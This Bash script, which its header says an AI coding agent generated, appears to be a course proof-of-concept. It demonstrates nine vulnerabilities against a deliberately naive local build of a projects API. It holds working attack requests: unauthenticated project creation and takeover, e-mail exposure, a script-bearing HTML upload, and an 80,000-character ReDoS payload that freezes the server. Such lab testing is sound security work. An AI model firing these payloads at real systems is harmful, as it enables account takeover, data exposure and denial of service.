#!/usr/bin/env bash
# Tool: Claude Code (claude-sonnet-5-5), autonomous developer agent
# Prompt Summary: "Write the PA2 proof-of-concept script that demonstrates vulnerabilities V1-V9 against the naive build"
# AI Contribution: 100% AI generated / 0% human refactored
# Human Modifications: none yet
# Verification: Run it against the docker compose stack and save the output (see usage below); not covered by Vitest
# Language/Stack: Bash / curl (Docker Compose stack)
# Confidence: Medium
#
# Usage (from functional-codebase/):
#   docker compose up --build -d
#   docker compose exec -T api node dist/cli.js seed
#   ./scripts/naive-checks-i2.sh | tee scripts/naive-checks-i2-output.txt
#   docker compose down
# Needs: bash, curl, docker compose. Every step prints PASS-on-naive-build when the attack WORKS (that is the bug).

set -uo pipefail

BASE_URL="${BASE_URL:-http://localhost:3000}"
API="$BASE_URL/api/v1/projects"
WORK_DIR="$(mktemp -d)"
trap 'rm -rf "$WORK_DIR"' EXIT

step() { printf '\n=== %s\n' "$*"; }
# Step 1: prints only the HTTP status code of a request (body goes to a temp file we can read afterwards).
code() { curl -s -o "$WORK_DIR/body" -w '%{http_code}' "$@"; }
first_id() { sed -n 's/^{"id":"\([^"]*\)".*/\1/p' | head -n 1; }
verdict() { printf '%s -> %s\n' "$1" "$2"; }

step "0. Wait for GET /health"
for i in $(seq 1 60); do
  curl -fsS "$BASE_URL/health" >/dev/null 2>&1 && break
  [ "$i" -eq 60 ] && { echo "API did not become healthy" >&2; exit 1; }
  sleep 1
done
echo "API is up"

step "V1 - no authentication (CWE-306): create a project with NO credentials"
C=$(code -X POST "$API" -H 'Content-Type: application/json' -d '{
  "title": "PoC victim project", "description": "owned by the real faculty member",
  "members": [{"name": "Dr. Real Owner", "email": "owner.poc@example.edu", "role": "faculty"}],
  "unit_ids": ["lab-sail"]}')
PID=$(first_id < "$WORK_DIR/body")
verdict "POST /projects without any credentials" "HTTP $C (expected 201 = VULNERABLE; project id $PID)"

step "V6 - PII exposure (CWE-359): anonymous GET shows member e-mails"
C=$(code "$API/$PID")
verdict "GET /projects/{id} anonymous" "HTTP $C"
grep -o '"email":"[^"]*"' "$WORK_DIR/body" || echo "(no e-mail found)"

step "V2 - broken object-level authorization (CWE-862/639): a stranger takes over the project"
C=$(code -X PUT "$API/$PID" -H 'Content-Type: application/json' -d '{
  "title": "PoC victim project", "description": "now owned by the attacker",
  "members": [{"name": "Mallory", "email": "mallory.poc@example.edu", "role": "faculty"}],
  "unit_ids": ["lab-sail"]}')
verdict "PUT /projects/{id} replaces the member list" "HTTP $C (expected 200 = VULNERABLE)"
grep -o '"email":"[^"]*"' "$WORK_DIR/body" || true

step "V5 - lost update (CWE-362): two writers, no version check"
BODY_A='{"title":"Edit from writer A","description":"a","members":[{"name":"Mallory","email":"mallory.poc@example.edu","role":"faculty"}],"unit_ids":["lab-sail"]}'
BODY_B='{"title":"Edit from writer B","description":"b","members":[{"name":"Mallory","email":"mallory.poc@example.edu","role":"faculty"}],"unit_ids":["lab-sail"]}'
CA=$(code -X PUT "$API/$PID" -H 'Content-Type: application/json' -d "$BODY_A")
CB=$(code -X PUT "$API/$PID" -H 'Content-Type: application/json' -d "$BODY_B")
verdict "writer A then writer B, both without a version" "HTTP $CA and HTTP $CB (both 200 = A's edit silently lost)"
code "$API/$PID" >/dev/null; grep -o '"title":"[^"]*"' "$WORK_DIR/body" | head -n 1

step "V3 - unrestricted upload (CWE-434): an .html file is accepted and served back as text/html"
C=$(code -X POST "$API/$PID/artifacts/manuscripts" -H 'Content-Type: application/json' -d '{"title":"PoC paper","abstract":"x","authors":["Mallory"],"keywords":["poc"],"year":2026}')
MID=$(first_id < "$WORK_DIR/body")
printf '<html><body><script>alert(1)</script></body></html>' > "$WORK_DIR/evil.html"
C=$(code -X POST "$API/$PID/artifacts/manuscripts/$MID/file" -F "file=@$WORK_DIR/evil.html;type=text/html")
verdict "upload evil.html" "HTTP $C (expected 201 = VULNERABLE)"
curl -s -D - -o /dev/null "$API/$PID/artifacts/manuscripts/$MID/file" | grep -i '^content-type\|^content-disposition\|^x-content-type'

step "V4 - resource consumption (CWE-770): unbounded page offset and repeated searches, no rate limit"
C=$(code "$API?keyword=a&page=1000000&page_size=100")
verdict "search with page=1000000" "HTTP $C (expected 200 = accepted)"
for i in 1 2 3 4 5 6 7 8 9 10; do code "$API?keyword=gaze" >/dev/null; done
echo "10 rapid anonymous searches completed with no 429 / throttling"

step "V9 - ReDoS (CWE-1333): one request with a long malformed e-mail freezes the API"
# Step 2: 80,000 dots between two '@' fit inside Express's 100 kB JSON limit but fail the regex after heavy backtracking.
EVIL=$(printf '%080000d' 0 | tr '0' '.')
printf '{"title":"redos","description":"x","members":[{"name":"X","email":"a@%s@","role":"student"}],"unit_ids":[]}' "$EVIL" > "$WORK_DIR/redos.json"
( curl -s -o /dev/null -w 'attack request finished: HTTP %{http_code} after %{time_total}s\n' -X POST "$API" -H 'Content-Type: application/json' --data-binary @"$WORK_DIR/redos.json" ) &
sleep 0.5
curl -s -o /dev/null -m 30 -w '/health during the attack answered after %{time_total}s (normally ~0.00s)\n' "$BASE_URL/health"
wait

step "V7 - no audit trail (CWE-778): destructive action leaves no record of who did it"
C=$(code -X DELETE "$API/$PID")
verdict "DELETE /projects/{id} anonymous" "HTTP $C (expected 204 = VULNERABLE)"
echo "Check the API log: docker compose logs api | tail -n 20  -> no caller identity is recorded."

step "V8 - infrastructure (CWE-798): static checks on the config files"
grep -n 'pp_password' docker-compose.yml .env.example 2>/dev/null || true
grep -n '"3000:3000"' docker-compose.yml || true
grep -c 'HEALTHCHECK' Dockerfile | sed 's/^/HEALTHCHECK lines in Dockerfile: /'

printf '\nDone. Save this output as functional-codebase/scripts/naive-checks-i2-output.txt\n'
